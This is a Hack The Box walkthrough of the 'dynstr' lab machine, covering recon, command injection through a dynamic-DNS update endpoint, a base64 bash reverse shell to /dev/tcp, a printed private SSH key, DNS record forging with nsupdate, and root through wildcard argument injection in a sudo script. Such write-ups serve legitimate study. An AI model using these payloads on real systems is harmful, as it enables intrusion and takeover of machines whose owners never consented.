

# Hackthebox [dynstr](https://www.hackthebox.eu/home/machines/profile/352)

![](https://i.imgur.com/euSjo5x.png)


# Port

<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;}
.tg td{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  overflow:hidden;padding:10px 5px;word-break:normal;}
.tg th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  font-weight:normal;overflow:hidden;padding:10px 5px;word-break:normal;}
.tg .tg-0pky{border-color:inherit;text-align:left;vertical-align:top}
</style>
<table class="tg">
<thead>
  <tr>
    <th class="tg-0pky"></th>
    <th class="tg-0pky"></th>
    <th class="tg-0pky"></th>
    <th class="tg-0pky"></th>
    <th class="tg-0pky"></th>
  </tr>
</thead>
<tbody>
  <tr>
    <td class="tg-0pky"></td>
    <td class="tg-0pky"></td>
    <td class="tg-0pky"></td>
    <td class="tg-0pky"></td>
    <td class="tg-0pky"></td>
  </tr>
  <tr>
    <td class="tg-0pky"></td>
    <td class="tg-0pky"></td>
    <td class="tg-0pky"></td>
    <td class="tg-0pky"></td>
    <td class="tg-0pky"></td>
  </tr>
  <tr>
    <td class="tg-0pky"></td>
    <td class="tg-0pky"></td>
    <td class="tg-0pky"></td>
    <td class="tg-0pky"></td>
    <td class="tg-0pky"></td>
  </tr>
</tbody>
</table>

| port | service |version | 
|------|--------|-------|
| 80 | http|  Apache httpd 2.4.41 |
| 22 | ssh |  Ubuntu 4ubuntu0.2  |
| 53 | domain |  ISC BIND 9.16.1 |
# Nmap
```bash
# Nmap 7.91 scan initiated Sun Jun 13 10:07:20 2021 as: nmap -T5 -p- -sCV --min-rate 25000 -oN nmap/alnmap.txt --vv 10.10.10.244
Increasing send delay for 10.10.10.244 from 0 to 5 due to 9067 out of 22667 dropped probes since last increase.
Warning: 10.10.10.244 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.244
Host is up, received reset ttl 63 (0.25s latency).
Scanned at 2021-06-13 10:07:21 IST for 39s
Not shown: 38109 filtered ports, 27423 closed ports
Reason: 38109 no-responses and 27423 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC//sbOTQwLRH4CGj3riDnnTvTCiJT1Uz7CyRSD2Tkh2wkT20rtAq13c5M1LC2kxki2bz9Ptxxx340Cc9tAcQaPZbmHndQe/H1bGiVZCKjOl2WqWQTV9fq6GGtflC94BkkLrmkWHzqg+S50g2Zg0iesPMkKAmwqwEVZx9npe1QuF3RQu5EYQXRYVOzpqQdU+jRD267gCvsKp9xmr7trZ1UzFxfBUOzSCWa3Adm2TTFwiA5jTb6x0lKVnQtgKghioMQeXXPuiTLCbI0XfbksoRI2OBAvTZf7RsIthKCiyCQRWjVh5Idr5Fh7GgwYaDgW662W3V3hCNEQRY8R9/fXWdVho1gWbm6NFt+NyRO/6F2XDvPseBYr+Yi6zwGEM+PpsTi5dfj8yYKRZ3HFXwjeBGjCPMRe9XPpCvvDnHAF18B1INVJPSwAIVll365V5D18JslQh7PpAWxO70TzmEC9E+UPXOrt29tZ0Zi/uApFRM700pdOhnvcs8q4RBWaUpp3ZB0=
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFtYzp8umMbm7o9+1LUTVio/dduowE/AsA3rO52A5Q/Cuct9GY6IZEvPE+/XpEiNCPMSl991kjHT+WaAunmTbT4=
|   256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOz8b9MDlSPP5QJgSHy6fpG98bdKCgvqhuu07v5NFkdx
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 13 10:08:00 2021 -- 1 IP address (1 host up) scanned in 40.07 seconds
```

# Domain names from main web page

![](https://i.imgur.com/Z3kZg57.png)

![](https://i.imgur.com/Lq6EBQg.png)

- dnsalias.htb[](http://dnsalias.htb)
- dynamicdns.htb[](http://dynamicdns.htb)
- no-ip.htb[](http://no-ip.htb)
- dns.dyna.htb[](http://dns.dyna.htb)
- dyna.htb[](http://dyna.htb)
 
**i have  run aquatone to check all webpage at same time**
 
 ![](https://i.imgur.com/JFcoPkt.png)

**All Pages looks same **

![](https://i.imgur.com/earjnRA.png)

# Looking Dns Recon
```bash
dns1.dyna.htb
```
![](https://i.imgur.com/GsNnIqp.png)

![](https://i.imgur.com/QFv1ktB.png)


# FUFF Found a directory
```bahs
http://dyna.htb/nic/update/
```
```bash
╭─root@kali ~/Desktop/htb/dynstr ‹master*› 
╰─# ffuf -w /opt/wordlists/medium.txt   -u http://dyna.htb/nic/FUZZ -e .php,.html,.txt, -t 100  | tee ffuf/ffuf.out 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://dyna.htb/nic/FUZZ
 :: Wordlist         : FUZZ: /opt/wordlists/medium.txt
 :: Extensions       : .php .html .txt  
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

index.html              [Status: 200, Size: 0, Words: 1, Lines: 1]
update                  [Status: 200, Size: 8, Words: 1, Lines: 2]
update                  [Status: 200, Size: 8, Words: 1, Lines: 2]

```

![](https://i.imgur.com/Kpf7Yqs.png)

while checking dyna update an [article](https://help.dyn.com/remote-access-api/perform-update/) 

![](https://i.imgur.com/cfjzvN2.png)


```bash
curl -X GET 'http://dynadns:sndanyd@dyna.htb/nic/update?hostname=`whoami`"dynadns.no-ip.htb&myip=10.10.14.5' --proxy 127.0.0.1:8080
```

![](https://i.imgur.com/wfnSG88.png)

so we can  inject  commands hostname here ..................!!!

# reverse shell
creating a base 64 reverse shell
```bash
╭─root@kali ~/Desktop/htb/dynstr ‹master*› 
╰─# echo "bash -i &>/dev/tcp/10.10.14.5/4444 <&1" | base64
YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjUvNDQ0NCA8JjEK
```
![](https://i.imgur.com/XJqaoKD.png)

```bash
curl -X GET 'http://dynadns:sndanyd@dyna.htb/nic/update?hostname=`echo+"YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjUvNDQ0NCA8JjEK"+|+base64+-d|+bash`"dynadns.no-ip.htb&myip=10.10.14.5'
```

![](https://i.imgur.com/tra1cCI.png)

# www-user
- running linpeas to giving any good result so lets check all manually

we have permission on this file
![](https://i.imgur.com/rKdpZc7.png)

while checking while checking while checking  i have seen __id_rsa__ file
```bash
cat /home/bindmgr/support-case-C62796521/strace-C62796521.txt
```

![](https://i.imgur.com/K5EvNEp.png)

i have removed \n from this and make it the ssh file as order

```id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3
HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F
L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn
UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX
CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

giving permmision for id_rsa file
```bash
chmod 600 id_rsa
```

while i am coonecting ssh its asks for password 

![](https://i.imgur.com/XQghOrs.png)

so lets check the .ssh directory

![](https://i.imgur.com/bHFb09U.png)

it is only allowing ssh from this  domain `*.infra.dyna.htb` 

# Exploiting 
we have to update PTR record

```bash
www-data@dynstr:/home/bindmgr/.ssh$ nsupdate -k /etc/bind/infra.key
> update add test.infra.dyna.htb 86400 A 10.10.14.4
> 
> update add 4.14.10.10.in-addr.arpa 300 PTR test.infra.dyna.htb
> send
> quit
www-data@dynstr:/home/bindmgr/.ssh$ 
```

now i can ssh from my device

```bash
╭─root@kali ~/Desktop/htb/dynstr ‹master*› 
╰─# ssh bindmgr@$IP -i id_rsa
Last login: Tue Jun  8 19:19:17 2021 from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
bindmgr@dynstr:~$ whoami
bindmgr
bindmgr@dynstr:~$ id
uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
bindmgr@dynstr:~$
```
- now we are bindmgr

# Root

```bash
sudo -l

bindmgr@dynstr:/tmp$ sudo -l  
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known  
Matching Defaults entries for bindmgr on dynstr:  
 env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  
  
User bindmgr may run the following commands on dynstr:  
 (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh  
```
Looks like we can run /usr/bin/local/bindmgr.sh as root 

  
```bash
\# This script generates named.conf.bindmgr to workaround the problem  
\# that  bind/named can only include single files but no directories.  
#  
\# It creates a named.conf.bindmgr file in /etc/bind that can be included  
\# from named.conf.local (or others) and will include all files from the  
\# directory /etc/bin/named.bindmgr.  
#  
\# NOTE: The script is work in progress. For now bind is not including  
#named.conf.bindmgr.  
#  
\# TODO: Currently the script is only adding files to the directory but  
#not deleting them. As we generate the list of files to be included  
#from the source directory they won't be included anyway.  
  
BINDMGR\_CONF=/etc/bind/named.conf.bindmgr  
BINDMGR\_DIR=/etc/bind/named.bindmgr  
  
indent() { sed 's/^/    /'; }  
  
\# Check versioning (.version)  
echo "\[+\] Running $0 to stage new configuration from $PWD."  
if \[\[ ! -f .version \]\] ; then  
 echo "\[-\] ERROR: Check versioning. Exiting."  
 exit 42  
fi   
if \[\[ "\`cat .version 2>/dev/null\`" -le "\`cat $BINDMGR\_DIR/.version 2>/dev/null\`" \]\] ; then                                                                     \[0/598\]  
 echo "\[-\] ERROR: Check versioning. Exiting."  
 exit 43  
fi  
\# Create config file that includes all files from named.bindmgr.  
echo "\[+\] Creating $BINDMGR\_CONF file."  
printf '// Automatically generated file. Do not modify manually.\\n' > $BINDMGR\_CONF   
for file in \* ; do  
 printf 'include "/etc/bind/named.bindmgr/%s";\\n' "$file" >> $BINDMGR\_CONF  
done  
  
\# Stage new version of configuration files.  
echo "\[+\] Staging files to $BINDMGR\_DIR."   
cp .version \* /etc/bind/named.bindmgr/  
  
\# Check generated configuration with named-checkconf.  
echo "\[+\] Checking staged configuration."   
named-checkconf $BINDMGR\_CONF >/dev/null  
if \[\[ $? -ne 0 \]\] ; then  
 echo "\[-\] ERROR: The generated configuration is not valid. Please fix following errors: "  
 named-checkconf $BINDMGR\_CONF 2>&1 | indent  
 exit 44  
else   
 echo "\[+\] Configuration successfully staged."  
 \# \*\*\* TODO \*\*\* Uncomment restart once we are live.  
 \# systemctl restart bind9  
 if \[\[ $? -ne 0 \]\] ; then  
 echo "\[-\] Restart of bind9 via systemctl failed. Please check logfile: "  
 systemctl status bind9  
 else  
 echo "\[+\] Restart of bind9 via systemctl succeeded."  
 fi  
fi  
```
 we can see that we need a .version file in the current directory with a version number so let’s create it.
 
 ```bash
 bindmgr@dynstr:~$ cat /usr/local/bin/bindmgr.sh | grep cp
cp .version * /etc/bind/named.bindmgr/
bindmgr@dynstr:~$ 
```

```bash
bindmgr@dynstr:/dev/shm$ echo "2" > .version 
```

we can see from the script that we can get the privilege on the binary in the same directory so let’s get /bin/bash to this directory.

```bash
bindmgr@dynstr:/dev/shm$ cp /bin/bash .  
```

Now let’s give it a suid bit and preserve that mode on that binary so now when we will execute the script we will get root privileged binary in /etc/bind/named.bindmgr/

```bash
bindmgr@dynstr:/dev/shm$ chmod +s bash  
bindmgr@dynstr:/dev/shm$ echo > --preserve=mode  
bindmgr@dynstr:/dev/shm$ ls -la  
total 1164  
drwxrwxrwt  2 root    root        100 Jun 14 08:41  .  
drwxr-xr-x 17 root    root       3940 Jun 12 21:02  ..  
\-rwsr-sr-x  1 bindmgr bindmgr 1183448 Jun 14 08:40  bash  
\-rw-rw-r--  1 bindmgr bindmgr       1 Jun 14 08:41 '--preserve=mode'  
\-rw-rw-r--  1 bindmgr bindmgr       2 Jun 14 08:40  .version  
```

Now let’s execute the sudo command and get the root privileges on our bash binary.

```bash
bindmgr@dynstr:~$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
cp: -r not specified; omitting directory 'support-case-C62796521'
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
    /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'
    /etc/bind/named.bindmgr/bash:40: unknown option 'YF'
    /etc/bind/name  
```
Now let’s run the bash as the privileged as root.

```bash
bindmgr@dynstr:~$ /etc/bind/named.bindmgr/bash -p   
bash-5.0# id
uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) egid=117(bind) groups=117(bind),1001(bindmgr)
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt 
c51************a81bc34d
bash-5.0#
```

Now we are root let’s get all the flags.
